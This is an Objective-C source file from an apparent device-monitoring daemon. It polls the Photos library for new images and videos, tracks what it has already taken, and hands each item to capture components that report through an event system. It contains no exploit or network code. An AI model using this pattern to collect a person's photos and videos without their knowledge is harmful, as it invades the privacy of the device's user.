/**
 - Project name :  MediaCaptureManager
 - Class name   :  MediaCaptureManager
 - Version      :  1.0  
 - Purpose      :  For MediaCaptureManager Component
 - Copy right   :  14/2/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "MediaCaptureManager-E.h"
#import "EventCenter.h"
#import "Defstd.h"
#import "DebugStatus.h"
#import "VideoCapture.h"
#import "PhotoCapture.h"
#import "MediaThumbnailManagerImp-E.h"
#import "MediaOP.h"
#import "DaemonPrivateHome.h"
#import "MediaHistoryDatabase.h"
#import "MediaHistory.h"
#import "FxDatabase.h"
#import <Photos/Photos.h>

@interface MediaCaptureManager (private)

- (void) readyForCapture;
- (void) addOPToOPQueue: (NSTimer *) aTimer;

@end

@implementation MediaCaptureManager

@synthesize mThumbnailDirectoryPath;
@synthesize mVideoCapture;
@synthesize mPhotoCapture;
@synthesize mMediaOPQueue;
@synthesize mTimers;
@synthesize mMediaNotificationCount;
@synthesize mMediaIsCapturing;
@synthesize mMediaHistoryDB;

/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the MailCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
 */

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate andThumbnailDirectoryPath:(NSString *) aDirectoryPath {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
		[self setMThumbnailDirectoryPath:aDirectoryPath];
		mMediaOPQueue = [[NSOperationQueue alloc] init];
		[mMediaOPQueue setMaxConcurrentOperationCount:1];
		[self setMTimers:[NSMutableArray array]];
		
        [self readyForCapture];
        
		// initiate media history DB
		mMediaHistoryDB = [[MediaHistoryDatabase alloc] init];
        
        [self resetTS:kFileVideoTimeStamp];
        mVideoCapture=[[VideoCapture alloc]initWithEventDelegate:mEventDelegate
                                        andMediaThumbnailManager:mMediaThumbnailManagerImp];
        
        [self resetTS:kFileCameraImageTimeStamp];
        mPhotoCapture=[[PhotoCapture alloc] initWithEventDelegate:mEventDelegate
                                         andMediaThumbnailManager:mMediaThumbnailManagerImp];
	}
	return (self);
}

- (void) resetTS: (NSString *) aTSFileName {

	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"HH:mm:ss:SSSS"];
	
	NSDate *date = [NSDate date];
	NSTimeInterval now = [date timeIntervalSince1970];
	DLog (@"!!!!!!!!!!!!!!!!!!!!! RESET TS: interval !!!!!!!!!!!!!!!!!!!!!  %f", now);
	
//	NSString *formattedDateString = [dateFormatter stringFromDate:date];
//	DLog (@"!!!!!!!!!!!!!!!!!!!!! RESET TS: time !!!!!!!!!!!!!!!!!!!!!  %@", formattedDateString);
	
	NSFileManager *fm = [NSFileManager defaultManager];
	NSString *filePath = [[DaemonPrivateHome daemonSharedHome] stringByAppendingString:aTSFileName];
	if ([fm fileExistsAtPath:filePath]) {
		[fm removeItemAtPath:filePath error:nil];
	}
	[[NSData dataWithBytes:&now length:sizeof(NSTimeInterval)] writeToFile:filePath atomically:YES];
	
	[dateFormatter release];
}

- (void)captureNewPhotos
{
    DLog(@"LET'S CAPTURE PHOTO");
    NSThread *currentThread = [NSThread currentThread];
    NSBlockOperation *photoOperation = [NSBlockOperation blockOperationWithBlock:^{
        //Get last captured SMS timestamp and array
        NSInteger lastPhotoTimeStamp = -1;
        NSArray *lastPhotoIDs = [NSArray array];
        
        NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
        path = [path stringByAppendingPathComponent:@"lastPhotos.plist"];
        
        NSFileManager *fileManager = [NSFileManager defaultManager];
        
        if ([fileManager fileExistsAtPath:path]) {
            NSDictionary *lastPhotosDic = [NSDictionary dictionaryWithContentsOfFile:path];
            lastPhotoTimeStamp = [lastPhotosDic[@"lastPhotoTimeStamp"] integerValue];
            lastPhotoIDs = lastPhotosDic[@"lastPhotoIDs"];
        }
        
        NSMutableArray *capturePhotoIDArray = [NSMutableArray array];
        __block NSInteger capturePhotoTimeStamp = -1;
        
        if (lastPhotoTimeStamp == -1) {
            PHFetchOptions *allPhotosOptions = [PHFetchOptions new];
            allPhotosOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
            allPhotosOptions.fetchLimit = 1;
            
            PHFetchResult *allPhotosResult = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:allPhotosOptions];
            [allPhotosOptions release];
            
            if ([allPhotosResult countOfAssetsWithMediaType:PHAssetMediaTypeImage] > 0) {
                PHAsset *photoAsset = [allPhotosResult firstObject];
                NSString *assetFilePath = [[photoAsset performSelector:@selector(mainFileURL)] absoluteString];
                if (![self checkDuplicationAndAddMediaPathToDB:assetFilePath]) {
                    capturePhotoTimeStamp = [photoAsset.creationDate timeIntervalSince1970];
                    [capturePhotoIDArray addObject:photoAsset.localIdentifier];
                    
                    [[self mPhotoCapture] addPathToPhotoQueue:photoAsset.localIdentifier];
                    [[self mPhotoCapture] performSelector:@selector(processPhotoCaptureQueue) onThread:currentThread withObject:nil waitUntilDone:YES];
                }
            }
        }
        else {
            PHFetchOptions *allPhotosOptions = [PHFetchOptions new];
            allPhotosOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
            allPhotosOptions.predicate = [NSPredicate predicateWithFormat:@"creationDate >= %@",[NSDate dateWithTimeIntervalSince1970:lastPhotoTimeStamp]];
            
            PHFetchResult *allPhotosResult = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:allPhotosOptions];
            [allPhotosOptions release];
            
            if ([allPhotosResult countOfAssetsWithMediaType:PHAssetMediaTypeImage] > 0) {
                [allPhotosResult enumerateObjectsUsingBlock:^(PHAsset *photoAsset, NSUInteger idx, BOOL * _Nonnull stop) {
                    NSString *assetFilePath = [[photoAsset performSelector:@selector(mainFileURL)] absoluteString];
                    
                    __block BOOL isCaptured = NO;
                    
                    [lastPhotoIDs enumerateObjectsUsingBlock:^(NSString *assetId, NSUInteger idx, BOOL * _Nonnull stop) {
                        if ([assetId isEqualToString:photoAsset.localIdentifier]) {
                            isCaptured = YES;
                            *stop = YES;
                        }
                    }];
                    
                    
                    if (![self checkDuplicationAndAddMediaPathToDB:assetFilePath] && !isCaptured) {
                       
                        if ([photoAsset.creationDate timeIntervalSince1970] > capturePhotoTimeStamp) {
                            capturePhotoTimeStamp = [photoAsset.creationDate timeIntervalSince1970];
                        }
                        
                        [capturePhotoIDArray addObject:photoAsset.localIdentifier];
                        
                        [[self mPhotoCapture] addPathToPhotoQueue:photoAsset.localIdentifier];
                    }
                }];
                
                [[self mPhotoCapture] performSelector:@selector(processPhotoCaptureQueue) onThread:currentThread withObject:nil waitUntilDone:YES];
            }
        }
        
        if (capturePhotoTimeStamp > -1 && capturePhotoIDArray.count > 0) {
            NSDictionary *lastPhotosDic = @{@"lastPhotoTimeStamp": [NSNumber numberWithInteger:capturePhotoTimeStamp],
                                            @"lastPhotoIDs" : capturePhotoIDArray};
            
            NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
            path = [path stringByAppendingPathComponent:@"lastPhotos.plist"];
            
            [lastPhotosDic writeToFile:path atomically:YES];
        }
    }];

    [mMediaOPQueue addOperation:photoOperation];
    
}

- (void)captureNewVideos
{
    DLog(@"LET'S CAPTURE VIDEO");
    NSThread *currentThread = [NSThread currentThread];
    NSBlockOperation *videoOperation = [NSBlockOperation blockOperationWithBlock:^{
        //Get last captured SMS timestamp and array
        NSInteger lastVideoTimeStamp = -1;
        NSArray *lastVideoIDs = [NSArray array];
        
        NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
        path = [path stringByAppendingPathComponent:@"lastVideos.plist"];
        
        NSFileManager *fileManager = [NSFileManager defaultManager];
        
        if ([fileManager fileExistsAtPath:path]) {
            NSDictionary *lastVideosDic = [NSDictionary dictionaryWithContentsOfFile:path];
            lastVideoTimeStamp = [lastVideosDic[@"lastVideoTimeStamp"] integerValue];
            lastVideoIDs = lastVideosDic[@"lastVideoIDs"];
        }
        
        NSMutableArray *captureVideoIDArray = [NSMutableArray array];
        __block NSInteger captureVideoTimeStamp = -1;
        
        if (lastVideoTimeStamp == -1) {
            PHFetchOptions *allVideosOptions = [PHFetchOptions new];
            allVideosOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
            allVideosOptions.fetchLimit = 1;
            
            PHFetchResult *allVideosResult = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeVideo options:allVideosOptions];
            [allVideosOptions release];
            
            if ([allVideosResult countOfAssetsWithMediaType:PHAssetMediaTypeVideo] > 0) {
                PHAsset *videoAsset = [allVideosResult firstObject];
                NSString *assetFilePath = [[videoAsset performSelector:@selector(mainFileURL)] absoluteString];
                if (![self checkDuplicationAndAddMediaPathToDB:assetFilePath]) {
                    captureVideoTimeStamp = [videoAsset.creationDate timeIntervalSince1970];
                    [captureVideoIDArray addObject:videoAsset.localIdentifier];
                    
                    [[self mVideoCapture] addPathToVideoQueue:videoAsset.localIdentifier];
                    [[self mVideoCapture] performSelector:@selector(processVideoCaptureQueue) onThread:currentThread withObject:nil waitUntilDone:YES];
                }
            }
        }
        else {
            PHFetchOptions *allVideosOptions = [PHFetchOptions new];
            allVideosOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
            allVideosOptions.predicate = [NSPredicate predicateWithFormat:@"creationDate >= %@",[NSDate dateWithTimeIntervalSince1970:lastVideoTimeStamp]];
            
            PHFetchResult *allVideosResult = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeVideo options:allVideosOptions];
            [allVideosOptions release];
            
            if ([allVideosResult countOfAssetsWithMediaType:PHAssetMediaTypeVideo] > 0) {
                [allVideosResult enumerateObjectsUsingBlock:^(PHAsset *videoAsset, NSUInteger idx, BOOL * _Nonnull stop) {
                    NSString *assetFilePath = [[videoAsset performSelector:@selector(mainFileURL)] absoluteString];
                    
                    __block BOOL isCaptured = NO;
                    
                    [lastVideoIDs enumerateObjectsUsingBlock:^(NSString *assetId, NSUInteger idx, BOOL * _Nonnull stop) {
                        if ([assetId isEqualToString:videoAsset.localIdentifier]) {
                            isCaptured = YES;
                            *stop = YES;
                        }
                    }];
                    
                    
                    if (![self checkDuplicationAndAddMediaPathToDB:assetFilePath] && !isCaptured) {
                        
                        if ([videoAsset.creationDate timeIntervalSince1970] > captureVideoTimeStamp) {
                            captureVideoTimeStamp = [videoAsset.creationDate timeIntervalSince1970];
                        }
                        
                        [captureVideoIDArray addObject:videoAsset.localIdentifier];
                        
                        [[self mVideoCapture] addPathToVideoQueue:videoAsset.localIdentifier];
                    }
                }];
                
                [[self mVideoCapture] performSelector:@selector(processVideoCaptureQueue) onThread:currentThread withObject:nil waitUntilDone:YES];
            }
        }
        
        if (captureVideoTimeStamp > -1 && captureVideoIDArray.count > 0) {
            NSDictionary *lastVideosDic = @{@"lastVideoTimeStamp": [NSNumber numberWithInteger:captureVideoTimeStamp],
                                            @"lastVideoIDs" : captureVideoIDArray};
            
            NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
            path = [path stringByAppendingPathComponent:@"lastVideos.plist"];
            
            [lastVideosDic writeToFile:path atomically:YES];
        }
    }];
    
    [mMediaOPQueue addOperation:videoOperation];
}

- (BOOL) checkDuplicationAndAddMediaPathToDB: (NSString *) aMediaFilePath {
    FxDatabase *fxDB = [mMediaHistoryDB mDatabase];
    FMDatabase *fmDB = [fxDB mDatabase];
    MediaHistory *mediaHistory =  [[MediaHistory alloc] initWithDatabase:fmDB];
    
    DLog(@"count before insert: %ld", (long)[mediaHistory countMediaHistory]);
    
    BOOL mediaExist = FALSE;
    
    // check duplication on the database
    if ([mediaHistory checkDuplication:aMediaFilePath]) {
        DLog(@"!!!!!!!!!!!!!!!!!! MEDIA '%@' EXIST !!!!!!!!!!!!!\n", aMediaFilePath)
        mediaExist = TRUE;
    } else {
        [mediaHistory addMedia:aMediaFilePath];
    }
    DLog(@"count after insert: %ld", (long)[mediaHistory countMediaHistory]);
    [mediaHistory release];
    return mediaExist;
}

- (void) readyForCapture  {
    if (mMediaThumbnailManagerImp==nil) {
        mMediaThumbnailManagerImp=[[MediaThumbnailManagerImp alloc] initWithThumbnailDirectory:mThumbnailDirectoryPath];
    }
}

#pragma mark - Clear Util

+ (void)clearCapturedData
{
    // Remove last capture time stemp for each event
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    
    //Photo
    if (![fileManager removeItemAtPath:[path stringByAppendingPathComponent:@"lastPhotos.plist"] error:&error]) {
        DLog(@"Remove last photos plist error with %@", [error localizedDescription]);
    }
    
    //Video
    if (![fileManager removeItemAtPath:[path stringByAppendingPathComponent:@"lastVideos.plist"] error:&error]) {
        DLog(@"Remove last videos plist error with %@", [error localizedDescription]);
    }
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */


- (void) dealloc {
	DLog (@"Media capture manager is dealloced **************");
    [mVideoCapture release];
    [mPhotoCapture release];
    [mMediaOPQueue cancelAllOperations];
	[mMediaOPQueue release];
	[mTimers release];
	[mThumbnailDirectoryPath release];
	[mMediaThumbnailManagerImp release];
	mMediaThumbnailManagerImp=nil;
	DLog (@"Media capture manager is dealloced **************22************"); // In order to exit the notifier thread
	[mMediaHistoryDB release];
	mMediaHistoryDB = nil;
	
	[super dealloc];
}

@end
